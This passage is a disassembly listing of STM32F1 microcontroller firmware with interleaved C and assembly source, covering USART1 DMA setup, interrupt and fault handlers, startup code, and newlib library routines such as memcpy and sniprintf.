    hdma_usart1_tx.Init.PeriphDataAlignment = DMA_PDATAALIGN_BYTE;
 800185e:	6123      	str	r3, [r4, #16]
    hdma_usart1_tx.Init.MemDataAlignment = DMA_MDATAALIGN_BYTE;
 8001860:	6163      	str	r3, [r4, #20]
    hdma_usart1_tx.Init.Mode = DMA_NORMAL;
 8001862:	61a3      	str	r3, [r4, #24]
    hdma_usart1_tx.Init.Priority = DMA_PRIORITY_LOW;
 8001864:	61e3      	str	r3, [r4, #28]
    if (HAL_DMA_Init(&hdma_usart1_tx) != HAL_OK)
 8001866:	f7fe fd33 	bl	80002d0 <HAL_DMA_Init>
 800186a:	b108      	cbz	r0, 8001870 <HAL_UART_MspInit+0xb8>
    {
      Error_Handler();
 800186c:	f7ff ff80 	bl	8001770 <Error_Handler>
    }

    __HAL_LINKDMA(huart,hdmatx,hdma_usart1_tx);

    /* USART1 interrupt Init */
    HAL_NVIC_SetPriority(USART1_IRQn, 0, 0);
 8001870:	2200      	movs	r2, #0
 8001872:	2025      	movs	r0, #37	; 0x25
    __HAL_LINKDMA(huart,hdmatx,hdma_usart1_tx);
 8001874:	6334      	str	r4, [r6, #48]	; 0x30
    HAL_NVIC_SetPriority(USART1_IRQn, 0, 0);
 8001876:	4611      	mov	r1, r2
    __HAL_LINKDMA(huart,hdmatx,hdma_usart1_tx);
 8001878:	6266      	str	r6, [r4, #36]	; 0x24
    HAL_NVIC_SetPriority(USART1_IRQn, 0, 0);
 800187a:	f7fe fcd3 	bl	8000224 <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(USART1_IRQn);
 800187e:	2025      	movs	r0, #37	; 0x25
 8001880:	f7fe fd04 	bl	800028c <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN USART1_MspInit 1 */

  /* USER CODE END USART1_MspInit 1 */
  }

}
 8001884:	b006      	add	sp, #24
 8001886:	bd70      	pop	{r4, r5, r6, pc}
 8001888:	40013800 	.word	0x40013800
 800188c:	40010800 	.word	0x40010800
 8001890:	20001a0c 	.word	0x20001a0c
 8001894:	40020058 	.word	0x40020058
 8001898:	40020044 	.word	0x40020044
 800189c:	200019c8 	.word	0x200019c8

080018a0 <NMI_Handler>:
 80018a0:	4770      	bx	lr

080018a2 <HardFault_Handler>:

/**
  * @brief This function handles Hard fault interrupt.
  */
void HardFault_Handler(void)
{
 80018a2:	e7fe      	b.n	80018a2 <HardFault_Handler>

080018a4 <MemManage_Handler>:

/**
  * @brief This function handles Memory management fault.
  */
void MemManage_Handler(void)
{
 80018a4:	e7fe      	b.n	80018a4 <MemManage_Handler>

080018a6 <BusFault_Handler>:

/**
  * @brief This function handles Prefetch fault, memory access fault.
  */
void BusFault_Handler(void)
{
 80018a6:	e7fe      	b.n	80018a6 <BusFault_Handler>

080018a8 <UsageFault_Handler>:

/**
  * @brief This function handles Undefined instruction or illegal state.
  */
void UsageFault_Handler(void)
{
 80018a8:	e7fe      	b.n	80018a8 <UsageFault_Handler>

080018aa <SVC_Handler>:
 80018aa:	4770      	bx	lr

080018ac <DebugMon_Handler>:
 80018ac:	4770      	bx	lr

080018ae <PendSV_Handler>:

/**
  * @brief This function handles Pendable request for system service.
  */
void PendSV_Handler(void)
{
 80018ae:	4770      	bx	lr

080018b0 <SysTick_Handler>:
void SysTick_Handler(void)
{
  /* USER CODE BEGIN SysTick_IRQn 0 */

  /* USER CODE END SysTick_IRQn 0 */
  HAL_IncTick();
 80018b0:	f7fe bc82 	b.w	80001b8 <HAL_IncTick>

080018b4 <DMA1_Channel4_IRQHandler>:
void DMA1_Channel4_IRQHandler(void)
{
  /* USER CODE BEGIN DMA1_Channel4_IRQn 0 */

  /* USER CODE END DMA1_Channel4_IRQn 0 */
  HAL_DMA_IRQHandler(&hdma_usart1_tx);
 80018b4:	4801      	ldr	r0, [pc, #4]	; (80018bc <DMA1_Channel4_IRQHandler+0x8>)
 80018b6:	f7fe bdc1 	b.w	800043c <HAL_DMA_IRQHandler>
 80018ba:	bf00      	nop
 80018bc:	200019c8 	.word	0x200019c8

080018c0 <DMA1_Channel5_IRQHandler>:
void DMA1_Channel5_IRQHandler(void)
{
  /* USER CODE BEGIN DMA1_Channel5_IRQn 0 */

  /* USER CODE END DMA1_Channel5_IRQn 0 */
  HAL_DMA_IRQHandler(&hdma_usart1_rx);
 80018c0:	4801      	ldr	r0, [pc, #4]	; (80018c8 <DMA1_Channel5_IRQHandler+0x8>)
 80018c2:	f7fe bdbb 	b.w	800043c <HAL_DMA_IRQHandler>
 80018c6:	bf00      	nop
 80018c8:	20001a0c 	.word	0x20001a0c

080018cc <USART1_IRQHandler>:
void USART1_IRQHandler(void)
{
  /* USER CODE BEGIN USART1_IRQn 0 */

  /* USER CODE END USART1_IRQn 0 */
  HAL_UART_IRQHandler(&huart1);
 80018cc:	4801      	ldr	r0, [pc, #4]	; (80018d4 <USART1_IRQHandler+0x8>)
 80018ce:	f7ff bbf7 	b.w	80010c0 <HAL_UART_IRQHandler>
 80018d2:	bf00      	nop
 80018d4:	20001a50 	.word	0x20001a50

080018d8 <_sbrk>:
	}
	return len;
}

caddr_t _sbrk(int incr)
{
 80018d8:	b508      	push	{r3, lr}
	extern char end asm("end");
	static char *heap_end;
	char *prev_heap_end;

	if (heap_end == 0)
 80018da:	4b0a      	ldr	r3, [pc, #40]	; (8001904 <_sbrk+0x2c>)
{
 80018dc:	4602      	mov	r2, r0
	if (heap_end == 0)
 80018de:	6819      	ldr	r1, [r3, #0]
 80018e0:	b909      	cbnz	r1, 80018e6 <_sbrk+0xe>
		heap_end = &end;
 80018e2:	4909      	ldr	r1, [pc, #36]	; (8001908 <_sbrk+0x30>)
 80018e4:	6019      	str	r1, [r3, #0]

	prev_heap_end = heap_end;
	if (heap_end + incr > stack_ptr)
 80018e6:	4669      	mov	r1, sp
	prev_heap_end = heap_end;
 80018e8:	6818      	ldr	r0, [r3, #0]
	if (heap_end + incr > stack_ptr)
 80018ea:	4402      	add	r2, r0
 80018ec:	428a      	cmp	r2, r1
 80018ee:	d906      	bls.n	80018fe <_sbrk+0x26>
	{
//		write(1, "Heap and stack collision\n", 25);
//		abort();
		errno = ENOMEM;
 80018f0:	f000 f858 	bl	80019a4 <__errno>
 80018f4:	230c      	movs	r3, #12
 80018f6:	6003      	str	r3, [r0, #0]
		return (caddr_t) -1;
 80018f8:	f04f 30ff 	mov.w	r0, #4294967295
 80018fc:	bd08      	pop	{r3, pc}
	}

	heap_end += incr;
 80018fe:	601a      	str	r2, [r3, #0]

	return (caddr_t) prev_heap_end;
}
 8001900:	bd08      	pop	{r3, pc}
 8001902:	bf00      	nop
 8001904:	200018f0 	.word	0x200018f0
 8001908:	20001a98 	.word	0x20001a98

0800190c <SystemInit>:
  */
void SystemInit (void)
{
  /* Reset the RCC clock configuration to the default reset state(for debug purpose) */
  /* Set HSION bit */
  RCC->CR |= 0x00000001U;
 800190c:	4b0f      	ldr	r3, [pc, #60]	; (800194c <SystemInit+0x40>)
 800190e:	681a      	ldr	r2, [r3, #0]
 8001910:	f042 0201 	orr.w	r2, r2, #1
 8001914:	601a      	str	r2, [r3, #0]

  /* Reset SW, HPRE, PPRE1, PPRE2, ADCPRE and MCO bits */
#if !defined(STM32F105xC) && !defined(STM32F107xC)
  RCC->CFGR &= 0xF8FF0000U;
 8001916:	6859      	ldr	r1, [r3, #4]
 8001918:	4a0d      	ldr	r2, [pc, #52]	; (8001950 <SystemInit+0x44>)
 800191a:	400a      	ands	r2, r1
 800191c:	605a      	str	r2, [r3, #4]
#else
  RCC->CFGR &= 0xF0FF0000U;
#endif /* STM32F105xC */   
  
  /* Reset HSEON, CSSON and PLLON bits */
  RCC->CR &= 0xFEF6FFFFU;
 800191e:	681a      	ldr	r2, [r3, #0]
 8001920:	f022 7284 	bic.w	r2, r2, #17301504	; 0x1080000
 8001924:	f422 3280 	bic.w	r2, r2, #65536	; 0x10000
 8001928:	601a      	str	r2, [r3, #0]

  /* Reset HSEBYP bit */
  RCC->CR &= 0xFFFBFFFFU;
 800192a:	681a      	ldr	r2, [r3, #0]
 800192c:	f422 2280 	bic.w	r2, r2, #262144	; 0x40000
 8001930:	601a      	str	r2, [r3, #0]

  /* Reset PLLSRC, PLLXTPRE, PLLMUL and USBPRE/OTGFSPRE bits */
  RCC->CFGR &= 0xFF80FFFFU;
 8001932:	685a      	ldr	r2, [r3, #4]
 8001934:	f422 02fe 	bic.w	r2, r2, #8323072	; 0x7f0000
 8001938:	605a      	str	r2, [r3, #4]

  /* Reset CFGR2 register */
  RCC->CFGR2 = 0x00000000U;      
#else
  /* Disable all interrupts and clear pending bits  */
  RCC->CIR = 0x009F0000U;
 800193a:	f44f 021f 	mov.w	r2, #10420224	; 0x9f0000
 800193e:	609a      	str	r2, [r3, #8]
#endif 

#ifdef VECT_TAB_SRAM
  SCB->VTOR = SRAM_BASE | VECT_TAB_OFFSET; /* Vector Table Relocation in Internal SRAM. */
#else
  SCB->VTOR = FLASH_BASE | VECT_TAB_OFFSET; /* Vector Table Relocation in Internal FLASH. */
 8001940:	f04f 6200 	mov.w	r2, #134217728	; 0x8000000
 8001944:	4b03      	ldr	r3, [pc, #12]	; (8001954 <SystemInit+0x48>)
 8001946:	609a      	str	r2, [r3, #8]
 8001948:	4770      	bx	lr
 800194a:	bf00      	nop
 800194c:	40021000 	.word	0x40021000
 8001950:	f8ff0000 	.word	0xf8ff0000
 8001954:	e000ed00 	.word	0xe000ed00

08001958 <Reset_Handler>:
  .weak Reset_Handler
  .type Reset_Handler, %function
Reset_Handler:

/* Copy the data segment initializers from flash to SRAM */
  movs r1, #0
 8001958:	2100      	movs	r1, #0
  b LoopCopyDataInit
 800195a:	e003      	b.n	8001964 <LoopCopyDataInit>

0800195c <CopyDataInit>:

CopyDataInit:
  ldr r3, =_sidata
 800195c:	4b0b      	ldr	r3, [pc, #44]	; (800198c <LoopFillZerobss+0x14>)
  ldr r3, [r3, r1]
 800195e:	585b      	ldr	r3, [r3, r1]
  str r3, [r0, r1]
 8001960:	5043      	str	r3, [r0, r1]
  adds r1, r1, #4
 8001962:	3104      	adds	r1, #4

08001964 <LoopCopyDataInit>:

LoopCopyDataInit:
  ldr r0, =_sdata
 8001964:	480a      	ldr	r0, [pc, #40]	; (8001990 <LoopFillZerobss+0x18>)
  ldr r3, =_edata
 8001966:	4b0b      	ldr	r3, [pc, #44]	; (8001994 <LoopFillZerobss+0x1c>)
  adds r2, r0, r1
 8001968:	1842      	adds	r2, r0, r1
  cmp r2, r3
 800196a:	429a      	cmp	r2, r3
  bcc CopyDataInit
 800196c:	d3f6      	bcc.n	800195c <CopyDataInit>
  ldr r2, =_sbss
 800196e:	4a0a      	ldr	r2, [pc, #40]	; (8001998 <LoopFillZerobss+0x20>)
  b LoopFillZerobss
 8001970:	e002      	b.n	8001978 <LoopFillZerobss>

08001972 <FillZerobss>:
/* Zero fill the bss segment. */
FillZerobss:
  movs r3, #0
 8001972:	2300      	movs	r3, #0
  str r3, [r2], #4
 8001974:	f842 3b04 	str.w	r3, [r2], #4

08001978 <LoopFillZerobss>:

LoopFillZerobss:
  ldr r3, = _ebss
 8001978:	4b08      	ldr	r3, [pc, #32]	; (800199c <LoopFillZerobss+0x24>)
  cmp r2, r3
 800197a:	429a      	cmp	r2, r3
  bcc FillZerobss
 800197c:	d3f9      	bcc.n	8001972 <FillZerobss>

/* Call the clock system intitialization function.*/
    bl  SystemInit
 800197e:	f7ff ffc5 	bl	800190c <SystemInit>
/* Call static constructors */
    bl __libc_init_array
 8001982:	f000 f815 	bl	80019b0 <__libc_init_array>
/* Call the application's entry point.*/
  bl main
 8001986:	f7ff fdb9 	bl	80014fc <main>
  bx lr
 800198a:	4770      	bx	lr
  ldr r3, =_sidata
 800198c:	080024cc 	.word	0x080024cc
  ldr r0, =_sdata
 8001990:	20000000 	.word	0x20000000
  ldr r3, =_edata
 8001994:	200018d4 	.word	0x200018d4
  ldr r2, =_sbss
 8001998:	200018d4 	.word	0x200018d4
  ldr r3, = _ebss
 800199c:	20001a98 	.word	0x20001a98

080019a0 <ADC1_2_IRQHandler>:
 * @retval : None
*/
    .section .text.Default_Handler,"ax",%progbits
Default_Handler:
Infinite_Loop:
  b Infinite_Loop
 80019a0:	e7fe      	b.n	80019a0 <ADC1_2_IRQHandler>
	...

080019a4 <__errno>:
 80019a4:	4b01      	ldr	r3, [pc, #4]	; (80019ac <__errno+0x8>)
 80019a6:	6818      	ldr	r0, [r3, #0]
 80019a8:	4770      	bx	lr
 80019aa:	bf00      	nop
 80019ac:	20001870 	.word	0x20001870

080019b0 <__libc_init_array>:
 80019b0:	b570      	push	{r4, r5, r6, lr}
 80019b2:	2500      	movs	r5, #0
 80019b4:	4e0c      	ldr	r6, [pc, #48]	; (80019e8 <__libc_init_array+0x38>)
 80019b6:	4c0d      	ldr	r4, [pc, #52]	; (80019ec <__libc_init_array+0x3c>)
 80019b8:	1ba4      	subs	r4, r4, r6
 80019ba:	10a4      	asrs	r4, r4, #2
 80019bc:	42a5      	cmp	r5, r4
 80019be:	d109      	bne.n	80019d4 <__libc_init_array+0x24>
 80019c0:	f000 fc78 	bl	80022b4 <_init>
 80019c4:	2500      	movs	r5, #0
 80019c6:	4e0a      	ldr	r6, [pc, #40]	; (80019f0 <__libc_init_array+0x40>)
 80019c8:	4c0a      	ldr	r4, [pc, #40]	; (80019f4 <__libc_init_array+0x44>)
 80019ca:	1ba4      	subs	r4, r4, r6
 80019cc:	10a4      	asrs	r4, r4, #2
 80019ce:	42a5      	cmp	r5, r4
 80019d0:	d105      	bne.n	80019de <__libc_init_array+0x2e>
 80019d2:	bd70      	pop	{r4, r5, r6, pc}
 80019d4:	f856 3025 	ldr.w	r3, [r6, r5, lsl #2]
 80019d8:	4798      	blx	r3
 80019da:	3501      	adds	r5, #1
 80019dc:	e7ee      	b.n	80019bc <__libc_init_array+0xc>
 80019de:	f856 3025 	ldr.w	r3, [r6, r5, lsl #2]
 80019e2:	4798      	blx	r3
 80019e4:	3501      	adds	r5, #1
 80019e6:	e7f2      	b.n	80019ce <__libc_init_array+0x1e>
 80019e8:	080024c4 	.word	0x080024c4
 80019ec:	080024c4 	.word	0x080024c4
 80019f0:	080024c4 	.word	0x080024c4
 80019f4:	080024c8 	.word	0x080024c8

080019f8 <memcpy>:
 80019f8:	b510      	push	{r4, lr}
 80019fa:	1e43      	subs	r3, r0, #1
 80019fc:	440a      	add	r2, r1
 80019fe:	4291      	cmp	r1, r2
 8001a00:	d100      	bne.n	8001a04 <memcpy+0xc>
 8001a02:	bd10      	pop	{r4, pc}
 8001a04:	f811 4b01 	ldrb.w	r4, [r1], #1
 8001a08:	f803 4f01 	strb.w	r4, [r3, #1]!
 8001a0c:	e7f7      	b.n	80019fe <memcpy+0x6>

08001a0e <memset>:
 8001a0e:	4603      	mov	r3, r0
 8001a10:	4402      	add	r2, r0
 8001a12:	4293      	cmp	r3, r2
 8001a14:	d100      	bne.n	8001a18 <memset+0xa>
 8001a16:	4770      	bx	lr
 8001a18:	f803 1b01 	strb.w	r1, [r3], #1
 8001a1c:	e7f9      	b.n	8001a12 <memset+0x4>
	...

08001a20 <sniprintf>:
 8001a20:	b40c      	push	{r2, r3}
 8001a22:	b530      	push	{r4, r5, lr}
 8001a24:	4b17      	ldr	r3, [pc, #92]	; (8001a84 <sniprintf+0x64>)
 8001a26:	1e0c      	subs	r4, r1, #0
 8001a28:	b09d      	sub	sp, #116	; 0x74
 8001a2a:	681d      	ldr	r5, [r3, #0]
 8001a2c:	da08      	bge.n	8001a40 <sniprintf+0x20>
 8001a2e:	238b      	movs	r3, #139	; 0x8b
 8001a30:	f04f 30ff 	mov.w	r0, #4294967295
 8001a34:	602b      	str	r3, [r5, #0]
 8001a36:	b01d      	add	sp, #116	; 0x74
 8001a38:	e8bd 4030 	ldmia.w	sp!, {r4, r5, lr}
 8001a3c:	b002      	add	sp, #8
 8001a3e:	4770      	bx	lr
 8001a40:	f44f 7302 	mov.w	r3, #520	; 0x208
 8001a44:	f8ad 3014 	strh.w	r3, [sp, #20]
 8001a48:	bf0c      	ite	eq
 8001a4a:	4623      	moveq	r3, r4
 8001a4c:	f104 33ff 	addne.w	r3, r4, #4294967295
 8001a50:	9304      	str	r3, [sp, #16]
 8001a52:	9307      	str	r3, [sp, #28]
 8001a54:	f64f 73ff 	movw	r3, #65535	; 0xffff
 8001a58:	9002      	str	r0, [sp, #8]
 8001a5a:	9006      	str	r0, [sp, #24]
 8001a5c:	f8ad 3016 	strh.w	r3, [sp, #22]
 8001a60:	9a20      	ldr	r2, [sp, #128]	; 0x80
 8001a62:	ab21      	add	r3, sp, #132	; 0x84
 8001a64:	a902      	add	r1, sp, #8
 8001a66:	4628      	mov	r0, r5
 8001a68:	9301      	str	r3, [sp, #4]
 8001a6a:	f000 f883 	bl	8001b74 <_svfiprintf_r>
 8001a6e:	1c43      	adds	r3, r0, #1
 8001a70:	bfbc      	itt	lt
 8001a72:	238b      	movlt	r3, #139	; 0x8b
 8001a74:	602b      	strlt	r3, [r5, #0]
 8001a76:	2c00      	cmp	r4, #0
 8001a78:	d0dd      	beq.n	8001a36 <sniprintf+0x16>
 8001a7a:	2200      	movs	r2, #0
 8001a7c:	9b02      	ldr	r3, [sp, #8]
 8001a7e:	701a      	strb	r2, [r3, #0]
 8001a80:	e7d9      	b.n	8001a36 <sniprintf+0x16>
 8001a82:	bf00      	nop
 8001a84:	20001870 	.word	0x20001870

08001a88 <strstr>:
 8001a88:	b5f0      	push	{r4, r5, r6, r7, lr}
 8001a8a:	7803      	ldrb	r3, [r0, #0]
 8001a8c:	b133      	cbz	r3, 8001a9c <strstr+0x14>
 8001a8e:	4603      	mov	r3, r0
 8001a90:	4618      	mov	r0, r3
 8001a92:	1c5e      	adds	r6, r3, #1
 8001a94:	781b      	ldrb	r3, [r3, #0]
 8001a96:	b933      	cbnz	r3, 8001aa6 <strstr+0x1e>
 8001a98:	4618      	mov	r0, r3
 8001a9a:	bdf0      	pop	{r4, r5, r6, r7, pc}
 8001a9c:	780b      	ldrb	r3, [r1, #0]
 8001a9e:	2b00      	cmp	r3, #0
 8001aa0:	bf18      	it	ne
 8001aa2:	2000      	movne	r0, #0
 8001aa4:	bdf0      	pop	{r4, r5, r6, r7, pc}
 8001aa6:	1e4d      	subs	r5, r1, #1
 8001aa8:	1e44      	subs	r4, r0, #1
 8001aaa:	f815 2f01 	ldrb.w	r2, [r5, #1]!
 8001aae:	2a00      	cmp	r2, #0
 8001ab0:	d0f3      	beq.n	8001a9a <strstr+0x12>
 8001ab2:	f814 7f01 	ldrb.w	r7, [r4, #1]!
 8001ab6:	4633      	mov	r3, r6
 8001ab8:	4297      	cmp	r7, r2
 8001aba:	d0f6      	beq.n	8001aaa <strstr+0x22>
 8001abc:	e7e8      	b.n	8001a90 <strstr+0x8>

08001abe <__ssputs_r>:
 8001abe:	e92d 47f0 	stmdb	sp!, {r4, r5, r6, r7, r8, r9, sl, lr}
 8001ac2:	688e      	ldr	r6, [r1, #8]
 8001ac4:	4682      	mov	sl, r0
 8001ac6:	429e      	cmp	r6, r3
 8001ac8:	460c      	mov	r4, r1
 8001aca:	4691      	mov	r9, r2
 8001acc:	4698      	mov	r8, r3
 8001ace:	d835      	bhi.n	8001b3c <__ssputs_r+0x7e>
 8001ad0:	898a      	ldrh	r2, [r1, #12]
 8001ad2:	f412 6f90 	tst.w	r2, #1152	; 0x480
 8001ad6:	d031      	beq.n	8001b3c <__ssputs_r+0x7e>
 8001ad8:	2302      	movs	r3, #2
 8001ada:	6825      	ldr	r5, [r4, #0]
 8001adc:	6909      	ldr	r1, [r1, #16]
 8001ade:	1a6f      	subs	r7, r5, r1
 8001ae0:	6965      	ldr	r5, [r4, #20]
 8001ae2:	eb05 0545 	add.w	r5, r5, r5, lsl #1
 8001ae6:	fb95 f5f3 	sdiv	r5, r5, r3
 8001aea:	f108 0301 	add.w	r3, r8, #1
 8001aee:	443b      	add	r3, r7
 8001af0:	429d      	cmp	r5, r3
 8001af2:	bf38      	it	cc
 8001af4:	461d      	movcc	r5, r3
 8001af6:	0553      	lsls	r3, r2, #21
 8001af8:	d531      	bpl.n	8001b5e <__ssputs_r+0xa0>
 8001afa:	4629      	mov	r1, r5
 8001afc:	f000 fb3a 	bl	8002174 <_malloc_r>
 8001b00:	4606      	mov	r6, r0
 8001b02:	b950      	cbnz	r0, 8001b1a <__ssputs_r+0x5c>
 8001b04:	230c      	movs	r3, #12
 8001b06:	f8ca 3000 	str.w	r3, [sl]
 8001b0a:	89a3      	ldrh	r3, [r4, #12]
 8001b0c:	f04f 30ff 	mov.w	r0, #4294967295
 8001b10:	f043 0340 	orr.w	r3, r3, #64	; 0x40
 8001b14:	81a3      	strh	r3, [r4, #12]
 8001b16:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 8001b1a:	463a      	mov	r2, r7
 8001b1c:	6921      	ldr	r1, [r4, #16]
 8001b1e:	f7ff ff6b 	bl	80019f8 <memcpy>
 8001b22:	89a3      	ldrh	r3, [r4, #12]
 8001b24:	f423 6390 	bic.w	r3, r3, #1152	; 0x480
 8001b28:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8001b2c:	81a3      	strh	r3, [r4, #12]
 8001b2e:	6126      	str	r6, [r4, #16]
 8001b30:	443e      	add	r6, r7
 8001b32:	6026      	str	r6, [r4, #0]
 8001b34:	4646      	mov	r6, r8
 8001b36:	6165      	str	r5, [r4, #20]
 8001b38:	1bed      	subs	r5, r5, r7
 8001b3a:	60a5      	str	r5, [r4, #8]
 8001b3c:	4546      	cmp	r6, r8
 8001b3e:	bf28      	it	cs
 8001b40:	4646      	movcs	r6, r8
 8001b42:	4649      	mov	r1, r9
 8001b44:	4632      	mov	r2, r6
 8001b46:	6820      	ldr	r0, [r4, #0]
 8001b48:	f000 faae 	bl	80020a8 <memmove>
 8001b4c:	68a3      	ldr	r3, [r4, #8]
 8001b4e:	2000      	movs	r0, #0
 8001b50:	1b9b      	subs	r3, r3, r6
 8001b52:	60a3      	str	r3, [r4, #8]
 8001b54:	6823      	ldr	r3, [r4, #0]
 8001b56:	441e      	add	r6, r3
 8001b58:	6026      	str	r6, [r4, #0]
 8001b5a:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 8001b5e:	462a      	mov	r2, r5
 8001b60:	f000 fb66 	bl	8002230 <_realloc_r>
 8001b64:	4606      	mov	r6, r0
 8001b66:	2800      	cmp	r0, #0
 8001b68:	d1e1      	bne.n	8001b2e <__ssputs_r+0x70>
 8001b6a:	6921      	ldr	r1, [r4, #16]
 8001b6c:	4650      	mov	r0, sl
 8001b6e:	f000 fab5 	bl	80020dc <_free_r>
 8001b72:	e7c7      	b.n	8001b04 <__ssputs_r+0x46>

08001b74 <_svfiprintf_r>:
 8001b74:	e92d 4ff0 	stmdb	sp!, {r4, r5, r6, r7, r8, r9, sl, fp, lr}
 8001b78:	b09d      	sub	sp, #116	; 0x74
 8001b7a:	9303      	str	r3, [sp, #12]
 8001b7c:	898b      	ldrh	r3, [r1, #12]
 8001b7e:	4680      	mov	r8, r0
 8001b80:	061c      	lsls	r4, r3, #24
 8001b82:	460d      	mov	r5, r1
 8001b84:	4616      	mov	r6, r2
 8001b86:	d50f      	bpl.n	8001ba8 <_svfiprintf_r+0x34>
 8001b88:	690b      	ldr	r3, [r1, #16]
 8001b8a:	b96b      	cbnz	r3, 8001ba8 <_svfiprintf_r+0x34>
 8001b8c:	2140      	movs	r1, #64	; 0x40
 8001b8e:	f000 faf1 	bl	8002174 <_malloc_r>
 8001b92:	6028      	str	r0, [r5, #0]
 8001b94:	6128      	str	r0, [r5, #16]
 8001b96:	b928      	cbnz	r0, 8001ba4 <_svfiprintf_r+0x30>
 8001b98:	230c      	movs	r3, #12
 8001b9a:	f8c8 3000 	str.w	r3, [r8]
 8001b9e:	f04f 30ff 	mov.w	r0, #4294967295
 8001ba2:	e0c4      	b.n	8001d2e <_svfiprintf_r+0x1ba>
 8001ba4:	2340      	movs	r3, #64	; 0x40
 8001ba6:	616b      	str	r3, [r5, #20]
 8001ba8:	2300      	movs	r3, #0
 8001baa:	9309      	str	r3, [sp, #36]	; 0x24
 8001bac:	2320      	movs	r3, #32
 8001bae:	f88d 3029 	strb.w	r3, [sp, #41]	; 0x29
 8001bb2:	2330      	movs	r3, #48	; 0x30
 8001bb4:	f04f 0b01 	mov.w	fp, #1
 8001bb8:	f88d 302a 	strb.w	r3, [sp, #42]	; 0x2a
 8001bbc:	4637      	mov	r7, r6
 8001bbe:	463c      	mov	r4, r7
 8001bc0:	f814 3b01 	ldrb.w	r3, [r4], #1
 8001bc4:	2b00      	cmp	r3, #0
 8001bc6:	d13c      	bne.n	8001c42 <_svfiprintf_r+0xce>
 8001bc8:	ebb7 0a06 	subs.w	sl, r7, r6
 8001bcc:	d00b      	beq.n	8001be6 <_svfiprintf_r+0x72>
 8001bce:	4653      	mov	r3, sl
 8001bd0:	4632      	mov	r2, r6
 8001bd2:	4629      	mov	r1, r5
 8001bd4:	4640      	mov	r0, r8
 8001bd6:	f7ff ff72 	bl	8001abe <__ssputs_r>
 8001bda:	3001      	adds	r0, #1
 8001bdc:	f000 80a2 	beq.w	8001d24 <_svfiprintf_r+0x1b0>
 8001be0:	9b09      	ldr	r3, [sp, #36]	; 0x24
 8001be2:	4453      	add	r3, sl
 8001be4:	9309      	str	r3, [sp, #36]	; 0x24
 8001be6:	783b      	ldrb	r3, [r7, #0]
 8001be8:	2b00      	cmp	r3, #0
 8001bea:	f000 809b 	beq.w	8001d24 <_svfiprintf_r+0x1b0>
 8001bee:	2300      	movs	r3, #0
 8001bf0:	f04f 32ff 	mov.w	r2, #4294967295
 8001bf4:	9304      	str	r3, [sp, #16]
 8001bf6:	9307      	str	r3, [sp, #28]
 8001bf8:	9205      	str	r2, [sp, #20]
 8001bfa:	9306      	str	r3, [sp, #24]
 8001bfc:	f88d 3053 	strb.w	r3, [sp, #83]	; 0x53
 8001c00:	931a      	str	r3, [sp, #104]	; 0x68
 8001c02:	2205      	movs	r2, #5
 8001c04:	7821      	ldrb	r1, [r4, #0]
 8001c06:	4850      	ldr	r0, [pc, #320]	; (8001d48 <_svfiprintf_r+0x1d4>)
 8001c08:	f000 fa40 	bl	800208c <memchr>
 8001c0c:	1c67      	adds	r7, r4, #1
 8001c0e:	9b04      	ldr	r3, [sp, #16]
 8001c10:	b9d8      	cbnz	r0, 8001c4a <_svfiprintf_r+0xd6>
 8001c12:	06d9      	lsls	r1, r3, #27
 8001c14:	bf44      	itt	mi
 8001c16:	2220      	movmi	r2, #32
 8001c18:	f88d 2053 	strbmi.w	r2, [sp, #83]	; 0x53
 8001c1c:	071a      	lsls	r2, r3, #28
 8001c1e:	bf44      	itt	mi
 8001c20:	222b      	movmi	r2, #43	; 0x2b
 8001c22:	f88d 2053 	strbmi.w	r2, [sp, #83]	; 0x53
 8001c26:	7822      	ldrb	r2, [r4, #0]
 8001c28:	2a2a      	cmp	r2, #42	; 0x2a
 8001c2a:	d016      	beq.n	8001c5a <_svfiprintf_r+0xe6>
 8001c2c:	2100      	movs	r1, #0
 8001c2e:	200a      	movs	r0, #10
 8001c30:	9a07      	ldr	r2, [sp, #28]
 8001c32:	4627      	mov	r7, r4
 8001c34:	783b      	ldrb	r3, [r7, #0]
 8001c36:	3401      	adds	r4, #1
 8001c38:	3b30      	subs	r3, #48	; 0x30
 8001c3a:	2b09      	cmp	r3, #9
 8001c3c:	d950      	bls.n	8001ce0 <_svfiprintf_r+0x16c>
 8001c3e:	b1c9      	cbz	r1, 8001c74 <_svfiprintf_r+0x100>
 8001c40:	e011      	b.n	8001c66 <_svfiprintf_r+0xf2>
 8001c42:	2b25      	cmp	r3, #37	; 0x25
 8001c44:	d0c0      	beq.n	8001bc8 <_svfiprintf_r+0x54>
 8001c46:	4627      	mov	r7, r4
 8001c48:	e7b9      	b.n	8001bbe <_svfiprintf_r+0x4a>
 8001c4a:	4a3f      	ldr	r2, [pc, #252]	; (8001d48 <_svfiprintf_r+0x1d4>)
 8001c4c:	463c      	mov	r4, r7
 8001c4e:	1a80      	subs	r0, r0, r2
 8001c50:	fa0b f000 	lsl.w	r0, fp, r0
 8001c54:	4318      	orrs	r0, r3
 8001c56:	9004      	str	r0, [sp, #16]
 8001c58:	e7d3      	b.n	8001c02 <_svfiprintf_r+0x8e>
 8001c5a:	9a03      	ldr	r2, [sp, #12]
 8001c5c:	1d11      	adds	r1, r2, #4
 8001c5e:	6812      	ldr	r2, [r2, #0]
 8001c60:	9103      	str	r1, [sp, #12]
 8001c62:	2a00      	cmp	r2, #0
 8001c64:	db01      	blt.n	8001c6a <_svfiprintf_r+0xf6>
 8001c66:	9207      	str	r2, [sp, #28]
 8001c68:	e004      	b.n	8001c74 <_svfiprintf_r+0x100>
 8001c6a:	4252      	negs	r2, r2
 8001c6c:	f043 0302 	orr.w	r3, r3, #2
 8001c70:	9207      	str	r2, [sp, #28]
 8001c72:	9304      	str	r3, [sp, #16]
 8001c74:	783b      	ldrb	r3, [r7, #0]
 8001c76:	2b2e      	cmp	r3, #46	; 0x2e
 8001c78:	d10d      	bne.n	8001c96 <_svfiprintf_r+0x122>
 8001c7a:	787b      	ldrb	r3, [r7, #1]
 8001c7c:	1c79      	adds	r1, r7, #1
 8001c7e:	2b2a      	cmp	r3, #42	; 0x2a
 8001c80:	d132      	bne.n	8001ce8 <_svfiprintf_r+0x174>
 8001c82:	9b03      	ldr	r3, [sp, #12]
 8001c84:	3702      	adds	r7, #2
 8001c86:	1d1a      	adds	r2, r3, #4
 8001c88:	681b      	ldr	r3, [r3, #0]
